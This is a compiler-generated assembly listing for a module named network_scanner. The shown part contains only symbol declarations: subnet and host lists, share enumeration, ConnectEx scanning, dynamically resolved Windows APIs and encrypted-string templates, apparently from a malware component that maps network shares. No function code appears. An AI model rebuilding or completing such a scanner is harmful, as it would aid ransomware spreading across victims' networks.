; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?g_HostEntry@@3PEAUhostent@@EA			; g_HostEntry
PUBLIC	?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
PUBLIC	?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A	; g_CriticalSection
PUBLIC	?g_SubnetList@@3Usubnet_list_@@A		; g_SubnetList
PUBLIC	?g_HostList@@3Uhost_list_@@A			; g_HostList
PUBLIC	?g_ConnectionList@@3Uconnection_list_@@A	; g_ConnectionList
PUBLIC	?g_IocpHandle@@3PEAXEA				; g_IocpHandle
PUBLIC	?g_ActiveOperations@@3JA			; g_ActiveOperations
_BSS	SEGMENT
?g_HostEntry@@3PEAUhostent@@EA DQ 01H DUP (?)		; g_HostEntry
?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA DQ 01H DUP (?) ; g_ConnectEx
?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A DB 028H DUP (?) ; g_CriticalSection
?g_SubnetList@@3Usubnet_list_@@A DB 010H DUP (?)	; g_SubnetList
?g_HostList@@3Uhost_list_@@A DB 010H DUP (?)		; g_HostList
?g_ConnectionList@@3Uconnection_list_@@A DB 010H DUP (?) ; g_ConnectionList
?g_IocpHandle@@3PEAXEA DQ 01H DUP (?)			; g_IocpHandle
?g_ActiveOperations@@3JA DD 01H DUP (?)			; g_ActiveOperations
_BSS	ENDS
msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__016BD130_queue@h DB 01H
__24398185_network_scanner@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__AA0A86E4_lmshare@h DB 01H
__3C800FCA_lmerr@h DB 01H
__F000109B_lmaccess@h DB 01H
__29BE2692_lmalert@h DB 01H
__FE41ED04_lmmsg@h DB 01H
__B1A3396F_lmremutl@h DB 01H
__412960F9_lmrepl@h DB 01H
__36344DEF_lmserver@h DB 01H
__74292230_lmsname@h DB 01H
__11469C09_lmsvc@h DB 01H
__ED83662C_lmuseflg@h DB 01H
__AD55E529_lmuse@h DB 01H
__E093E3BB_lmwksta@h DB 01H
__8A0B57F9_lmapibuf@h DB 01H
__7199D9DF_lmerrlog@h DB 01H
__AA30A8CB_lmconfig@h DB 01H
__E3DEC41A_lmstats@h DB 01H
__B71F8CEF_lmaudit@h DB 01H
__CA8934D5_lmjoin@h DB 01H
__00047EAB_lm@h DB 01H
__8E608713_icmpapi@h DB 01H
__DEBB33B8_ws2ipdef@h DB 01H
__A77EB452_ws2tcpip@h DB 01H
__145BE446_shtypes@h DB 01H
__519668A6_shlwapi@h DB 01H
__1A8DA7E2_mswsockdef@h DB 01H
__A783183B_MSWSock@h DB 01H
__3106C9CE_memory@h DB 01H
__93890D6E_filesystem@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__ED66B863_memory@h DB 01H
__8070D656_threadpool@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__457AF2B3_logs@h DB 01H
__AF241CAA_network_scanner@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	RtlSecureZeroMemory
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?StartScan@network_scanner@@YAXXZ		; network_scanner::StartScan
PUBLIC	?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ; network_scanner::EnumShares
PUBLIC	?pCancelIo@@YAHPEAX@Z				; pCancelIo
PUBLIC	?pWaitForSingleObject@@YAKPEAXK@Z		; pWaitForSingleObject
PUBLIC	?pGetLastError@@YAKXZ				; pGetLastError
PUBLIC	?plstrcatW@@YAPEA_WPEA_WPEB_W@Z			; plstrcatW
PUBLIC	?pCloseHandle@@YAHPEAX@Z			; pCloseHandle
PUBLIC	?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z			; plstrcpyW
PUBLIC	?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
PUBLIC	?plstrcmpiW@@YAHPEB_W0@Z			; plstrcmpiW
PUBLIC	?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ; pCreateTimerQueueTimer
PUBLIC	?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
PUBLIC	?pDeleteTimerQueue@@YAHPEAX@Z			; pDeleteTimerQueue
PUBLIC	?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection
PUBLIC	?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pInitializeCriticalSection
PUBLIC	?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z ; pGetQueuedCompletionStatus
PUBLIC	?pExitThread@@YAXK@Z				; pExitThread
PUBLIC	?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ; pPostQueuedCompletionStatus
PUBLIC	?pSleep@@YAXK@Z					; pSleep
PUBLIC	?pGlobalAlloc@@YAPEAXI_K@Z			; pGlobalAlloc
PUBLIC	?pGlobalFree@@YAPEAXPEAX@Z			; pGlobalFree
PUBLIC	?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pDeleteCriticalSection
PUBLIC	?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z	; pCreateIoCompletionPort
PUBLIC	?pCreateTimerQueue@@YAPEAXXZ			; pCreateTimerQueue
PUBLIC	?pNetApiBufferFree@@YAKPEAX@Z			; pNetApiBufferFree
PUBLIC	?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z	; pNetShareEnum
PUBLIC	?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ; pGetIpNetTable
PUBLIC	?pgethostbyname@@YAPEAUhostent@@PEBD@Z		; pgethostbyname
PUBLIC	?pgethostname@@YAHPEADH@Z			; pgethostname
PUBLIC	?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z ; pWSAIoctl
PUBLIC	?pclosesocket@@YAH_K@Z				; pclosesocket
PUBLIC	?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z ; pWSAAddressToStringW
PUBLIC	?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ; pWSASocketW
PUBLIC	?pbind@@YAH_KPEBUsockaddr@@H@Z			; pbind
PUBLIC	?psetsockopt@@YAH_KHHPEBDH@Z			; psetsockopt
PUBLIC	?pgetsockopt@@YAH_KHHPEADPEAH@Z			; pgetsockopt
PUBLIC	?pshutdown@@YAH_KH@Z				; pshutdown
PUBLIC	?pWSAStartup@@YAHGPEAUWSAData@@@Z		; pWSAStartup
PUBLIC	?pWSACleanup@@YAHXZ				; pWSACleanup
PUBLIC	?pStrStrIA@@YAPEBDPEBD0@Z			; pStrStrIA
PUBLIC	?pinet_ntoa@@YAPEADUin_addr@@@Z			; pinet_ntoa
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	?GetCurrentIpAddress@@YAKXZ			; GetCurrentIpAddress
PUBLIC	?GetConnectEX@@YAHXZ				; GetConnectEX
PUBLIC	?GetSubnets@@YAHPEAUsubnet_list_@@@Z		; GetSubnets
PUBLIC	??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
